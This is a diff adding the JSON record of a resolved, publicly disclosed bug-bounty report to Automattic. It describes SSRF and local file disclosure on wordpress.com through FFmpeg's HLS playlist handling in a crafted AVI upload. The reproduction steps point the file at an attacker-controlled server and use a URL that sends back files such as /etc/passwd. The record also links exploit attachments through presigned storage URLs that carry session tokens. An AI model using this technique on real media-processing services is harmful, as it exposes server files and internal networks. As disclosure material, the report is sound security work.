@@ -1,0 +1,129 @@
+{
+  "id": 237381,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMzczODE=",
+  "url": "https://hackerone.com/reports/237381",
+  "title": "SSRF and local file disclosure in https://wordpress.com/media/videos/ via FFmpeg HLS processing",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2017-06-06T21:13:33.946Z",
+  "submitted_at": "2017-06-06T21:13:33.946Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "neex",
+    "url": "/neex",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/mxguogqjdb4jdwjc379o0se6457e/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 111,
+    "url": "https://hackerone.com/automattic",
+    "handle": "automattic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Automattic",
+      "twitter_handle": "",
+      "website": "https://automattic.com",
+      "about": "WordPress.com, WooCommerce, WordPress VIP, Jetpack, Beeper, Texts, Akismet, Gravatar, Crowdsignal, Tumblr and more!"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2017-07-29T15:30:07.191Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-06-29T15:29:53.042Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### Summary\n\nFFmpeg is a video encoding software that appears to be used by wordpress.com for video processing (for paid accounts). FFmpeg is known to process HLS playlists that may contain references to external files. I was able to fire this feature using GAB2 subtitle chunks inside an AVI file. After that, I was able to retrieve conversion nodes' local files and fire SSRF requests.\n\n# Note that the AVI file attached is not a screen capture of the exploitation process, but the exploit itself. Do not try to play it!\n\n### Reproduction steps for SSRF\n\n1. Open attached file `http_q.avi` in a hex editor and find http link (currently it's `http://45.55.40.92/ssrf_test`). Modify it so it points to a server under your control. **You need to keep binary layout of the file, so you might want to add or remove some `#`s from the comment on the line below**\n2. Go to https://wordpress.com/media/videos/<your blog>. **You need paid account to make this work**. Upload the resulting video, then select it, click \"Edit\" and wait a little bit.\n3. You'll receive an HTTP request to your server from some server inside automattic. In the access log, you'll see an entry like this:\n   \n   ```\n   192.0.87.12 - - [06/Jun/2017:21:42:35 +0200] \"GET /test_ssrf HTTP/1.1\" 200 117 \"-\" \"Lavf/56.25.101\"\n   ```\n\n   According to whois information, 192.0.87.12 belongs to Automattic, Inc.\n    \n    \n### Reproduction steps for local file disclosure\n\nReading files is a little bit trickier --- it uses FFmpeg's ability to concatinate all segments of an HLS playlist into another playlist. I wrote a script that exploits this issue, `file_reading_server.py` (attached to the report). You'll need to run it on any server under your control  (of course, the script doesn't need to be run on the target server, it will use the SSRF & HLS playlists to retrieve files from it). \n\n1. Get a droplet/VPS/whatever with an external IP. Launch my script like this: `python3 file_reading_server.py --external-addr <external-ip-of-your-server> --port 8080` (you'll need python3.5).\n2. As in SSRF repro step 1, modify `http_q.avi` so the link inside it will point to your server and be like this: `http://<external-ip-of-your-server>:8080/initial.m3u?filename=/etc/passwd`. You can replace `/etc/passwd` with another filename if you want.\n3. As in SSRF repro step 2, upload the resulting file to wordpress.com and click \"Edit\". After a while, some debug output of my script will be printed to console (because of SSRF requests). Wait until the output stops. Then check the working dir of the script. It will contain a file with name like this: `<some random string>_<filename-without-slashes>`. The contents of this file was received from the node that runs FFmpeg.\n\n\nUsing this approach, I was able to dump `/etc/issue`:\n```\nDebian GNU/Linux 8 \\n \\l\n``` \n\nand `/etc/hostname`:\n```\ntc1.videos.dca.wordpress.com\n```\n",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 191998,
+      "file_name": "http_q.avi",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/191/998/738af496dcdfe9140c22388240c08410ab2349d0/http_q.avi?response-content-disposition=attachment%3B%20filename%3D%22http_q.avi%22%3B%20filename%2A%3DUTF-8%27%27http_q.avi&response-content-type=video%2Fx-msvideo&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ZVXRWMB%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T211502Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDPJGfzMJPn%2FnHJrTg5TD8VJt7cc%2B7xt9arg9h87wjVTQIhAM%2B08WEUMC%2BUcx%2B2hdKE1ivgl69a2PFRDj0l1KQ35JOLKrIFCBoQAxoMMDEzNjE5Mjc0ODQ5Igxc6REi1pVr2zXPDYAqjwWCRNoXIU3Z8A9klwjX%2B4PXU5JMH4n3c4Xxyac%2FzcM4qEjGokM%2BodDuiCfV810H3RPNumOTmghuwpUtOqPiGZA0R6o4FfqXdVBJePjhoWFMZ5oyYhx8QoKT8PuzXNSA%2BpYbeLaQsOUGTAm7J75i0xTnBaL0Et8rpP3G3oZYzAU9OWGzkWuWo678fx%2F5oDeet6aguCO8%2FjDWAWiMPlN6oxA0Y4i8bURv5uhAbItXZl%2F0yhE2exJIDYuhibnmpFXE4%2Bh4OMBilIIaDJsskKaEvoRiBsP8PY5r9dUOPsiC2t1PrepaAylZRfjhQbU57g7kP%2BXv2Azc%2BaOC75t5dhupRUh3IutnzlkORL%2F9flfqfUwX%2Fn59Do8kRUtwAkCh3yRX10QjKZJ2ne4Iur3gmDYd7730ppAiYM1bJzBy64ccOil8x%2Bvg5kbFGNGzp9YfSc5ghFx%2BbloLgola%2Fni8oWJUsddymBwlOH1Nc1b8NaCF8sS543cl06BvyxFgTXcV%2BT1nYqmbNng7EacdyxDRA59wMe5EnLiHC9jf%2Fyed12tpPd7TuQum%2BZd5NMJ9l81o7GuQiV3Iwf7RfCipikpLdbEPrJ5KBz7N7ollSoHwBUmWFblws1uxvZ5ABLQCuLJXsIqDmwNZ8YeMo1Zl9PnApt6IBcXabJBIFW4QXgunB7XW%2FF8GEeBgWNPfJtR3gqYmZ4zNpydWJwwCQaxcSHzmhhIOe6NvN7K2ZLMO0i6h3M969d2ihazkodAbxBC8Qqi%2FO56M8pBcQ7RKERw1uOQVuOsUo00sLCOm9GI2vjoArqPsi2uqO8TymUrFN39ZbthQYfkk2QX3l30Kdtn%2F7or8XF7u2KLGun8MrTx9qKmP5rLywvEAMKbWwMYGOrAB5%2FUWgKr5RM0ekkakDndGCJIxQ1WUbxY2OhlZhi04RNqJLNUFscc5LCSsEv3VcDs9juIIgGNGSuS3aBOH06ehWLv8fV8Dci%2B0LfF%2Blop%2BQYN5P5q53wN%2FrQR837AV2pfRO9dOJarpcAoes%2B7W3iJxwKZRVrBcxvyyMt89kGzZLpab25bXG8Pp4OEOA%2FJOj1iBHT%2FNZPGiAkEIqPPujxC7I78QwyK2z%2BpF8s4ZRzTnxLc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c351d1512b917fff167d28dd15832be31e932b235553cc100e02df6ac74bde2f",
+      "file_size": 955373,
+      "type": "video/x-msvideo",
+      "moderated": null
+    },
+    {
+      "id": 191999,
+      "file_name": "file_reading_server.py",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/191/999/49f0bed12d5d9e4792c9ca1e2933608f1adc692e/file_reading_server.py?response-content-disposition=attachment%3B%20filename%3D%22file_reading_server.py%22%3B%20filename%2A%3DUTF-8%27%27file_reading_server.py&response-content-type=text%2Fx-python&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ZVXRWMB%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T211502Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDPJGfzMJPn%2FnHJrTg5TD8VJt7cc%2B7xt9arg9h87wjVTQIhAM%2B08WEUMC%2BUcx%2B2hdKE1ivgl69a2PFRDj0l1KQ35JOLKrIFCBoQAxoMMDEzNjE5Mjc0ODQ5Igxc6REi1pVr2zXPDYAqjwWCRNoXIU3Z8A9klwjX%2B4PXU5JMH4n3c4Xxyac%2FzcM4qEjGokM%2BodDuiCfV810H3RPNumOTmghuwpUtOqPiGZA0R6o4FfqXdVBJePjhoWFMZ5oyYhx8QoKT8PuzXNSA%2BpYbeLaQsOUGTAm7J75i0xTnBaL0Et8rpP3G3oZYzAU9OWGzkWuWo678fx%2F5oDeet6aguCO8%2FjDWAWiMPlN6oxA0Y4i8bURv5uhAbItXZl%2F0yhE2exJIDYuhibnmpFXE4%2Bh4OMBilIIaDJsskKaEvoRiBsP8PY5r9dUOPsiC2t1PrepaAylZRfjhQbU57g7kP%2BXv2Azc%2BaOC75t5dhupRUh3IutnzlkORL%2F9flfqfUwX%2Fn59Do8kRUtwAkCh3yRX10QjKZJ2ne4Iur3gmDYd7730ppAiYM1bJzBy64ccOil8x%2Bvg5kbFGNGzp9YfSc5ghFx%2BbloLgola%2Fni8oWJUsddymBwlOH1Nc1b8NaCF8sS543cl06BvyxFgTXcV%2BT1nYqmbNng7EacdyxDRA59wMe5EnLiHC9jf%2Fyed12tpPd7TuQum%2BZd5NMJ9l81o7GuQiV3Iwf7RfCipikpLdbEPrJ5KBz7N7ollSoHwBUmWFblws1uxvZ5ABLQCuLJXsIqDmwNZ8YeMo1Zl9PnApt6IBcXabJBIFW4QXgunB7XW%2FF8GEeBgWNPfJtR3gqYmZ4zNpydWJwwCQaxcSHzmhhIOe6NvN7K2ZLMO0i6h3M969d2ihazkodAbxBC8Qqi%2FO56M8pBcQ7RKERw1uOQVuOsUo00sLCOm9GI2vjoArqPsi2uqO8TymUrFN39ZbthQYfkk2QX3l30Kdtn%2F7or8XF7u2KLGun8MrTx9qKmP5rLywvEAMKbWwMYGOrAB5%2FUWgKr5RM0ekkakDndGCJIxQ1WUbxY2OhlZhi04RNqJLNUFscc5LCSsEv3VcDs9juIIgGNGSuS3aBOH06ehWLv8fV8Dci%2B0LfF%2Blop%2BQYN5P5q53wN%2FrQR837AV2pfRO9dOJarpcAoes%2B7W3iJxwKZRVrBcxvyyMt89kGzZLpab25bXG8Pp4OEOA%2FJOj1iBHT%2FNZPGiAkEIqPPujxC7I78QwyK2z%2BpF8s4ZRzTnxLc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e03781c09e48539b8a16d39d0f8cc81e1081119150ff20d1987083f485e84270",
+      "file_size": 7952,
+      "type": "text/x-python",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-07-29T15:29:53.097Z",
+  "allow_singular_disclosure_after": -257147109.57471275,
+  "singular_disclosure_allowed": true,
+  "vote_count": 60,
+  "voters": [
+    "bug1riage-jobert",
+    "nytr0gen",
+    "n1m0",
+    "jensec",
+    "mashoud1122",
+    "inhibitor181",
+    "mirhat",
+    "hunter",
+    "abze",
+    "metawolf",
+    "and 50 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
